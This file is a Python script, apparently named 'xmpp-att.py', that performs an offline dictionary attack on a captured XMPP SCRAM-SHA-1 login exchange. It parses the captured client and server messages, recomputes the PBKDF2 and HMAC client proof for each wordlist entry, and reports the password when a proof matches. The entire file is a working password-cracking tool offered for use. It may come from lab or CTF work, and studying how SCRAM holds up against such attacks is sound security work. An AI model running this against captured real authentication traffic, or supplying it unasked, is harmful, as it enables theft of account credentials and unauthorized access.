import hashlib
import hmac
import base64
from pathlib import Path
import art
import sys
from rich import print as rprint
from tqdm import tqdm

def salted_sha1_PBKDF2(password, salt, rounds):
    # Appliquer PBKDF2-SHA-1
    salted_password = hashlib.pbkdf2_hmac('sha1', password, salt ,rounds)

    return salted_password.hex()

def hmac_sha1(key, message):
    hmac_sha1 = hmac.new(key, message, hashlib.sha1)

    # Retourner le résultat en hexadécimal
    return hmac_sha1.hexdigest()

import hashlib

def sha1(message):
    # Calculer le hash SHA-1
    sha1_hash = hashlib.sha1(message)

    # Retourner le résultat en hexadécimal
    return sha1_hash.hexdigest()

def string_xor(m1, m2):
    res =  int(m1,16) ^ int(m2,16)
    return '{:x}'.format(res)

def xmpp(username, password, client_nonce, intial_message, server_challenge, salt_b64, rounds):
    r_value = ""
    k = 0
    while server_challenge[k] != ",":
        r_value+=server_challenge[k]
        k+=1;
    client_final_message_bare = "c=biws,"+r_value
    salted_password = salted_sha1_PBKDF2(password.encode("utf-8"),bytes.fromhex(salt),rounds)
    #print("salted password =",salted_password)

    salt_client_key = "Client Key"
    client_key = hmac_sha1(bytes.fromhex(salted_password),salt_client_key.encode("utf-8"))
    #print("clientKey =",client_key)

    stored_key = sha1(bytes.fromhex(client_key))
    #print("sotredKey =",stored_key)

    auth_message = "n="+username+",r="+client_nonce+","+server_challenge+","+client_final_message_bare
    #print("auth message =",auth_message)

    client_signature = hmac_sha1(bytes.fromhex(stored_key), auth_message.encode("utf-8"))
    #print("client signature =",client_signature)

    client_proof = string_xor(client_key, client_signature)
    #print("client proof =",client_proof)
    if (len(client_proof)%2!=0):
        client_proof = "0"+client_proof

    """
    salt_server_key = "Server Key"
    server_key = hmac_sha1(bytes.fromhex(salted_password), salt_server_key.encode("utf-8"))
    #print("server key =",server_key)

    server_signature = hmac_sha1(bytes.fromhex(server_key), auth_message.encode("utf-8"))
    #print("server signature =",server_signature)
    """

    p_value = base64.b64encode(bytes.fromhex(client_proof)).decode("utf-8")
    client_final_message = client_final_message_bare+",p="+p_value
    #print("client final message =",client_final_message)

    return client_final_message

def help():
    rprint("[bold]Usage : python3 xmpp-att.py -i VALUE -s VALUE -c VALUE -w PATH[/bold]")
    rprint("Performs a dictionnary attack against an XMPP exchange between the server and the user.")
    rprint("")
    rprint("    [yellow]-h[/yellow]     display this help and exit")
    rprint("    [yellow]-i VALUE[/yellow]    replace VALUE with the value of the intial message sent by the client (ex: [deep_sky_blue1]-i n,,n=user,r=fyko+d2lbbFgONRv9qkxdawL[/deep_sky_blue1])")
    rprint("    [yellow]-s VALUE[/yellow]    replace VALUE with the value of the server's message (ex: [deep_sky_blue1]-s r=fyko+d2lbbFgONRv9qkxdawL3rfcNHYJY1ZVvWVs7j,s=QSXCR+Q6sek8bf92,i=4096[/deep_sky_blue1])")
    rprint("    [yellow]-c VALUE[/yellow]    replace VALUE with the value of the client's final message sent by the client (ex: [deep_sky_blue1]-c c=biws,r=fyko+d2lbbFgONRv9qkxdawL3rfcNHYJY1ZVvWVs7j,p=v0X8v3Bz2T0CJGbJQyF0X+HI4Ts=[/deep_sky_blue1])")
    rprint("    [yellow]-w PATH[/yellow]     replace PATH with the path to a wordlist (ex: [deep_sky_blue1]-w ~/files/wordlist/small_wordlist.txt[/deep_sky_blue1])")

    sys.exit(1)

#User input
art.tprint("XMPP ATT",font="bulbhead")

initial_message, server_challenge, client_final_message, wordlist = "", "", "", ""

if "-h" in sys.argv:
    help()

try:
    initial_message = sys.argv[sys.argv.index("-i") + 1]
except:
    rprint("[red bold]Missing value for -i[/red bold]")
    help()

try:
    server_challenge = sys.argv[sys.argv.index("-s") + 1]
except:
    rprint("[red bold]Missing value for -s[/red bold]")
    help()

try:
    client_final_message = sys.argv[sys.argv.index("-c") + 1]
except:
    rprint("[red bold]Missing value for -c[/red bold]")
    help()

try:
    wordlist = sys.argv[sys.argv.index("-w") + 1]
    wordlist = wordlist.replace("~", str(Path.home()))
except:
    rprint("[red bold]Missing path for -w[/red bold]")
    help()

if len(sys.argv) < 9:
    rprint("[red bold]Not enough arguments[/red bold]")
    help()
if len(sys.argv) > 9:
    rprint("[red bold]Too much arguments[/red bold]")
    help()

w = open(wordlist,"rb")

#parsing values from input
nonce_start=0
for i in range(len(initial_message)-1):
    if initial_message[i] == "r" and initial_message[i+1] == "=":
        nonce_start=i+2
client_nonce = initial_message[nonce_start:]
username_start=0
username_end=0
for i in range(len(initial_message)-1):
    if initial_message[i] == "n" and initial_message[i+1] == "=":
        username_start = i+2
    if initial_message[i] == ",":
        username_end = i
username = initial_message[username_start:username_end]

salt_start=0
salt_end=0
for i in range(len(server_challenge)-1):
    if server_challenge[i] == "s" and server_challenge[i+1] == "=":
        salt_start = i+2
    if server_challenge[i] == ",":
        salt_end = i
salt_b64 = server_challenge[salt_start:salt_end]
salt = base64.b64decode(salt_b64).hex()

s_rounds_start=0
k = len(server_challenge)-1
while server_challenge[k] != "=":
    s_rounds_start=k
    k-=1
rounds=int(server_challenge[s_rounds_start:])

progress_bar = tqdm(w)
#start the attack
for word in progress_bar:
    try:
        password = word.decode("utf-8")
        password = password.replace("\n","")
        res = xmpp(username, password, client_nonce, initial_message, server_challenge, salt_b64, rounds)
        if res == client_final_message:
            rprint("[green bold] FOUND PASSWORD :[/green bold]",password)
            progress_bar.close()
            break
    except KeyboardInterrupt:
        progress_bar.close()
        sys.exit(0)
    except:
        rprint("[red bold]Could not decode[/red bold]",word)
        rprint("[bold]Resuming attack...[/bold]")
